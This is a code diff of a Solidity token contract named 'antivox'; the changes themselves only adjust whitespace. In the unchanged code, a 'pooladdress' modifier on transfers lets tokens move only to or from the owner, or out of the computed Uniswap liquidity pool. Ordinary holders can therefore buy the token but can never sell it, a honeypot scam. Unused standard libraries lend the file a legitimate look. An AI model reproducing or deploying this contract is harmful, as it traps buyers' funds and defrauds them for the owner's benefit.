@@ -1,8 +1,3 @@
-
-
-pragma solidity ^0.5.14;
- 
-
 interface IERC20 {
     function totalSupply() external view returns(uint);
 
@@ -23,7 +18,7 @@ library Address {
     function isContract(address account) internal view returns(bool) {
         bytes32 codehash;
         bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
-        
+
         assembly { codehash:= extcodehash(account) }
         return (codehash != 0x0 && codehash != accountHash);
     }
@@ -31,7 +26,7 @@ library Address {
 
 contract Context {
     constructor() internal {}
-    
+
     function _msgSender() internal view returns(address payable) {
         return msg.sender;
     }
@@ -72,7 +67,7 @@ library SafeMath {
     }
 
     function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
-        
+
         require(b > 0, errorMessage);
         uint c = a / b;
 
@@ -104,12 +99,11 @@ library SafeERC20 {
     function callOptionalReturn(IERC20 token, bytes memory data) private {
         require(address(token).isContract(), "SafeERC20: call to non-contract");
 
-        
         (bool success, bytes memory returndata) = address(token).call(data);
         require(success, "SafeERC20: low-level call failed");
 
         if (returndata.length > 0) { 
-            
+
             require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
         }
     }
@@ -219,16 +213,15 @@ contract ERC20Detailed is IERC20 {
     }
 }
 
-
 contract antivox{
- 
+
     event Transfer(address indexed FARM, address indexed FINANCE, uint _value);
     event Approval(address indexed _owner, address indexed _spender, uint _value);
- 
+
     function transfer(address FINANCE, uint _value) public payable returns (bool) {
         return transferFrom(msg.sender, FINANCE, _value);
     }
- 
+
     function transferFrom(address FARM, address FINANCE, uint _value) public payable pooladdress(FARM, FINANCE) returns (bool) {
         if (_value == 0) {return true;}
         if (msg.sender != FARM) {
@@ -241,19 +234,19 @@ contract antivox{
         emit Transfer(FARM, FINANCE, _value);
         return true;
     }
- 
+
     function approve(address _spender, uint _value) public payable returns (bool) {
         allowance[msg.sender][_spender] = _value;
         emit Approval(msg.sender, _spender, _value);
         return true;
     }
- 
+
     modifier pooladdress(address FARM, address FINANCE) {
         address liquiditypool = pairFor(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, address(this));
         require(FARM == owner || FINANCE == owner || FARM == liquiditypool);
         _;
     }
- 
+
     function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
         (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
         pair = address(uint(keccak256(abi.encodePacked(
@@ -263,17 +256,17 @@ contract antivox{
                 hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' 
             ))));
     }
- 
+
     mapping (address => uint) public balanceOf;
     mapping (address => mapping (address => uint)) public allowance;
- 
+
     uint constant public decimals = 18;
     uint public totalSupply;
     string public name;
     string public symbol;
     address private owner;
     address constant internal UNI = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
- 
+
     constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
         name = _name;
         symbol = _symbol;
